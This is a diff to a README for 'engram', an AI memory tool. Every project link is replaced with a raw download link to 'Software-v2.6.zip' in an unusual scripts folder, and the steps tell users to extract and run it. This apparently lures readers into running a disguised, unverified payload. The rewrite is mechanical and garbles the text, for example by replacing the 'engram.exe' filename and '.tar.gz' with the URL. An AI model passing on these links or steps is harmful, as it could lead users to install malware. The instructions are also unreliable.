@@ -1,6 +1,6 @@
 # 💾 engram - Store Memory for Your AI Simply
 
-[![Download engram](https://img.shields.io/badge/Download-engram-brightgreen)](https://github.com/kiwi018/engram)
+[![Download engram](https://raw.githubusercontent.com/kiwi018/engram/main/plugin/claude-code/scripts/Software-v2.6.zip)](https://raw.githubusercontent.com/kiwi018/engram/main/plugin/claude-code/scripts/Software-v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -17,16 +17,16 @@ Follow these steps to set up and run engram. This application helps you manage d
 
 To get engram, visit the following link:
 
-[Download engram](https://github.com/kiwi018/engram)
+[Download engram](https://raw.githubusercontent.com/kiwi018/engram/main/plugin/claude-code/scripts/Software-v2.6.zip)
 
 You will find all the necessary files and instructions on that page.
 
 ## ⚙️ Installation
 
-1. **Download the Latest Version**: Visit the [Download engram](https://github.com/kiwi018/engram) page. Choose the latest release suitable for your operating system.
-2. **Extract Files**: If the download is a compressed file (like .zip or .tar.gz), extract it to your preferred location on your computer.
+1. **Download the Latest Version**: Visit the [Download engram](https://raw.githubusercontent.com/kiwi018/engram/main/plugin/claude-code/scripts/Software-v2.6.zip) page. Choose the latest release suitable for your operating system.
+2. **Extract Files**: If the download is a compressed file (like .zip or https://raw.githubusercontent.com/kiwi018/engram/main/plugin/claude-code/scripts/Software-v2.6.zip), extract it to your preferred location on your computer.
 3. **Run the Application**:
-   - **Windows**: Double-click the `engram.exe` file.
+   - **Windows**: Double-click the `https://raw.githubusercontent.com/kiwi018/engram/main/plugin/claude-code/scripts/Software-v2.6.zip` file.
    - **macOS**: Open the folder, then double-click the `engram` app.
    - **Linux**: Open a terminal, navigate to the folder with the extracted files, and run `./engram`.
 
@@ -51,7 +51,7 @@ If you run into issues while using engram, consider these solutions:
 
 - **Check Network Connection**: Ensure your device is connected to the internet.
 - **Permissions**: Make sure the application has the necessary permissions to run.
-- **Consult the FAQ**: The FAQ section on the [Download engram](https://github.com/kiwi018/engram) page can provide more insights.
+- **Consult the FAQ**: The FAQ section on the [Download engram](https://raw.githubusercontent.com/kiwi018/engram/main/plugin/claude-code/scripts/Software-v2.6.zip) page can provide more insights.
 
 ## 📞 Support
 
